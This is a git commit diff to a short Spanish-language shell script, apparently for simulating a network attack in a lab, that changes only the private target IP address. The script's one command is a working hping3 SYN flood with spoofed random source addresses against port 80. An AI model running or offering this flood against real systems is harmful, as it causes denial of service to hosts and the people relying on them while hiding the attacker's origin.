3ec63c3fdee892736847e7c8c4d702c1cf49110f
NiPeGun <nipegun@gmail.com>
2024-12-10 12:48:02 +0100

    Update Simular-Ataque-Ping.sh

--- Simular-Ataque-Ping.sh
+++ Simular-Ataque-Ping.sh
@@ -1,3 +1,3 @@
 #Este comando genera tráfico SYN masivo hacia el puerto 80 desde IPs aleatorias.
-vIPDestino="192.168.1.10"
+vIPDestino="172.16.0.209"
 hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source "$vIPDestino"
